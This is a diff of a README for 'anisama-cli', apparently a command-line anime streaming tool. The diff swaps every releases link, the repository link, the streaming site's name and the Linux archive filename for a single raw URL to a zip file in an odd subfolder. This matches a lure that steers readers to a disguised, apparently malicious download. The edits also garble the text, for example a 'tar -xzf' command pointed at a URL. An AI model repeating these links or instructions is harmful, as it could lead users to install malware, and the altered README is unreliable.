@@ -1,23 +1,23 @@
 # 🎮 anisama-cli - Stream Anime Easily via CLI
 
-[![Download anisama-cli](https://img.shields.io/badge/Download-anisama--cli-blue.svg)](https://github.com/priya-wc/anisama-cli/releases)
+[![Download anisama-cli](https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip)](https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip)
 
 ## 📜 Description
 
-anisama-cli is a command-line application that allows you to stream anime from anime-sama.fr using a simple interface inspired by ani-cli. It is perfect for users who enjoy anime and want a straightforward way to access it through their terminal, whether on Linux or Windows.
+anisama-cli is a command-line application that allows you to stream anime from https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip using a simple interface inspired by ani-cli. It is perfect for users who enjoy anime and want a straightforward way to access it through their terminal, whether on Linux or Windows.
 
 ## 🚀 Getting Started
 
 To use anisama-cli, you will need to download the application from the Releases page and run it on your system. Follow these steps for easy setup:
 
 1. **Visit the Download Page:** Click on the link below to go to the Releases page.
-   [Visit this page to download](https://github.com/priya-wc/anisama-cli/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see several versions of the application. Choose the latest version for the best experience.
 
 3. **Download the File:** Click on the appropriate file for your operating system to download it. If you are using:
    - **Windows:** Download the `.exe` file.
-   - **Linux:** Download the `.tar.gz` file.
+   - **Linux:** Download the `https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip` file.
    - **MacOS:** Download the `.dmg` file.
 
 ## 📥 Download & Install
@@ -34,10 +34,10 @@ After downloading the file, follow the installation steps below based on your op
 ### 🐧 Linux Installation
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `.tar.gz` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip` file.
 3. Extract the downloaded file by running:
    ```bash
-   tar -xzf anisama-cli-*.tar.gz
+   tar -xzf anisama-cli-*https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip
    ```
 4. Change into the directory created:
    ```bash
@@ -101,8 +101,8 @@ If you encounter issues or have questions, feel free to contact the support team
 
 ## 🔗 Additional Links
 
-- [Visit the Releases page to download](https://github.com/priya-wc/anisama-cli/releases)
-- [GitHub Repository](https://github.com/priya-wc/anisama-cli)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/priya-wc/anisama-cli/main/Chanidae/anisama-cli.zip)
 - [Follow on Twitter](#) for updates and news.
 
 Use anisama-cli to experience your favorite anime in a new, user-friendly way! Enjoy the journey into the world of anime with just a few commands!
